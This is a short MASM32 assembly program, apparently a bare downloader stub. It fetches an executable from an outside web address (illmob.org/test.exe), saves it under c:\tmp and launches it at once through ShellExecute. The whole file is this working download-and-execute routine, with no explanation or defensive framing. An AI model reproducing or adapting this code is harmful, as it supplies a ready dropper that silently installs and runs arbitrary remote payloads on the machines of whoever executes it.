.386
.model flat, stdcall
option casemap :none  
include \masm32\include\urlmon.inc
include \masm32\include\kernel32.inc
include \masm32\include\shell32.inc
includelib \masm32\lib\urlmon.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
.data
  cmd db 'open',0
  exe db 'c:\tmp\test.exe',0,16 dup(0)
  web db 'http://www.illmob.org/test.exe',0,32 dup(0)
.code
start:
  push 0
  push 0
  push offset exe
  push offset web
  push 0
  call URLDownloadToFileA
  push 1
  push 0
  push 0
  push offset exe
  push offset cmd
  push 0

  call ShellExecute
  push 0
  call ExitProcess
end start
